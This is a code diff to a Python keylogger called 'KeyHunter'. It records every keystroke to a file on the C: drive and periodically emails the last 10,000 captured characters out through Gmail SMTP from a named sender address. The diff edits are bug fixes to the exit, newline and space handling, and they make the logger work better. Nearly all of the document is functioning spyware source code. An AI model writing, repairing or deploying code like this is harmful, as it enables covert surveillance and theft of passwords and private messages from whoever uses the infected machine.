@@ -7,6 +7,7 @@ import datetime
 import smtplib
 from email.mime.text import MIMEText
 import os
+import sys
 
 ########################################################
 
@@ -55,8 +56,8 @@ def send_email(message,toaddrs):
         
 
         fromaddr = 'keyhunter.hackspc@gmail.com'
-        username = 'xxxxxx'
-        password = 'xxxxxx'
+        username = 'xxxx'
+        password = 'xxxx'
         message+="<br><br>" +"BR KeyHunter Team "
         msg = MIMEText(message, 'html')
         msg['Subject']  = "KeyHunter Report -- " +str(datetime.datetime.now()) + " --"
@@ -75,22 +76,27 @@ def send_email(message,toaddrs):
           
 
 def OnKeyboardEvent(event):
-    
+    #press CTRL+E to exit
     if event.Ascii==5:
-        _exit(1)
+        sys.exit(0)
     if event.Ascii !=0 or 8:
         #open output.txt to read current keystrokes
         f=open('c:\output.txt','r+')
         buffer=f.read()
         f.close()
+        
         if len(buffer)%1001==0:
             #send last 10000 characters
             send_email(buffer[-10000:],email)
         #open output.txt to write current + new keystrokes
         f=open('c:\output.txt','w')
         keylogs=chr(event.Ascii)
+        #if user press ENTER 
         if event.Ascii==13:
-            keylogs='/n'
+            keylogs='\n'
+        #if user press space    
+        if event.Ascii==32:
+            keylogs='  '
         buffer+=keylogs
         f.write(buffer)
         f.close()
